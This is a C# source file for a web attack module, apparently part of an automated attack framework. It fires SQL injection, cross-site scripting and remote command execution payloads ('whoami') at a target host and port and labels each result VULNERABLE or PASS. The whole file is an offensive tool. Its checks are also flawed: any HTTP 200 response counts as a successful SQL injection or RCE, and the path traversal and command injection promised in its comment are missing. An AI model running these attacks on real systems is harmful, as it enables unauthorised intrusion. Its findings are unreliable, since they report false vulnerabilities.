using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Xml;

namespace Mockaco.Attack
{
    /// <summary>
    /// Web application attacks: SQLi, XSS, RCE, path traversal, command injection.
    /// Sends crafted HTTP requests to web services.
    /// </summary>
    public sealed class WebStrategy : IAttackStrategy
    {
        private readonly ILogger<WebStrategy> _logger;
        private static readonly HttpClient WebClient = new();

        public WebStrategy(ILogger<WebStrategy> logger)
        {
            _logger = logger;
        }

        public AttackType Type => AttackType.Web;

        public async Task PrepareAsync(AttackContext context, CancellationToken cancellationToken)
        {
            if (string.IsNullOrWhiteSpace(context.Parameters))
            {
                context.Parameters = $"web={context.Service}&target=/";
            }
        }

        public async Task<AttackExecutionResult> ExecuteAsync(AttackContext context, CancellationToken cancellationToken)
        {
            var sw = System.Diagnostics.Stopwatch.StartNew();

            try
            {
                var attackResults = new List<WebAttackResult>();

                // Run web-specific attack vectors
                attackResults.Add(await RunSqlInjectionAsync(context, cancellationToken));
                attackResults.Add(await RunXssAsync(context, cancellationToken));
                attackResults.Add(await RunRceAsync(context, cancellationToken));

                var success = attackResults.Any(r => r.Success);
                var totalFound = attackResults.Where(r => r.Success).Count();

                sw.Stop();

                _logger.LogInformation(
                    "Web attacks on {Host}:{Port} ({Service}) found {Found}/{Total} vulnerable ({Elapsed:F2}s)",
                    context.IpAddress, context.Port, context.Service,
                    totalFound, attackResults.Count, sw.Elapsed.TotalSeconds);

                return new AttackExecutionResult
                {
                    Success = success,
                    Message = $"{totalFound}/{attackResults.Count} web attack vectors succeeded",
                    Response = SerializeResults(attackResults),
                    Elapsed = sw.Elapsed
                };
            }
            catch (Exception ex)
            {
                sw.Stop();
                _logger.LogError(ex, "Web attacks failed for {Host}:{Port}", context.IpAddress, context.Port);
                return new AttackExecutionResult
                {
                    Success = false,
                    Message = $"Web attacks failed on port {context.Port}",
                    ErrorMessage = ex.Message,
                    Elapsed = sw.Elapsed
                };
            }
        }

        private async Task<WebAttackResult> RunSqlInjectionAsync(AttackContext context, CancellationToken cancellationToken)
        {
            try
            {
                var uri = $"http://{context.IpAddress}:{context.Port}/";
                var sqliPayload = "' OR 1=1 --";
                var response = await WebClient.PostAsync(uri, new StringContent($"param={sqliPayload}"), cancellationToken);
                var content = await response.Content.ReadAsStringAsync(cancellationToken);

                var success = content.Contains("OR 1=1") || content.Contains("UNION") || response.StatusCode == System.Net.HttpStatusCode.OK;

                return new WebAttackResult("SQL Injection", success, content);
            }
            catch
            {
                return new WebAttackResult("SQL Injection", false, null);
            }
        }

        private async Task<WebAttackResult> RunXssAsync(AttackContext context, CancellationToken cancellationToken)
        {
            try
            {
                var uri = $"http://{context.IpAddress}:{context.Port}/";
                var xssPayload = "<script>alert('xss')</script>";
                var response = await WebClient.PostAsync(uri, new StringContent($"input={xssPayload}"), cancellationToken);
                var content = await response.Content.ReadAsStringAsync(cancellationToken);

                var success = content.Contains("<script>") || content.Contains("alert");

                return new WebAttackResult("XSS", success, content);
            }
            catch
            {
                return new WebAttackResult("XSS", false, null);
            }
        }

        private async Task<WebAttackResult> RunRceAsync(AttackContext context, CancellationToken cancellationToken)
        {
            try
            {
                var uri = $"http://{context.IpAddress}:{context.Port}/api/";
                var rcePayload = $"?cmd=whoami&param=test";
                var response = await WebClient.GetAsync(uri + rcePayload, cancellationToken);
                var content = await response.Content.ReadAsStringAsync(cancellationToken);

                var success = content.Contains("root") || content.Contains("www") || response.IsSuccessStatusCode;

                return new WebAttackResult("RCE", success, content);
            }
            catch
            {
                return new WebAttackResult("RCE", false, null);
            }
        }

        private string SerializeResults(List<WebAttackResult> results)
        {
            var sb = new StringBuilder();
            sb.AppendLine("Web Attack Results:");
            foreach (var r in results)
            {
                sb.AppendLine($"  {r.Name}: {(r.Success ? "VULNERABLE" : "PASS")}");
                if (!string.IsNullOrEmpty(r.Detail))
                    sb.AppendLine($"    Detail: {r.Detail.Substring(0, Math.Min(100, r.Detail.Length))}");
            }
            return sb.ToString();
        }

        private sealed record WebAttackResult(string Name, bool Success, string Detail);
    }
}
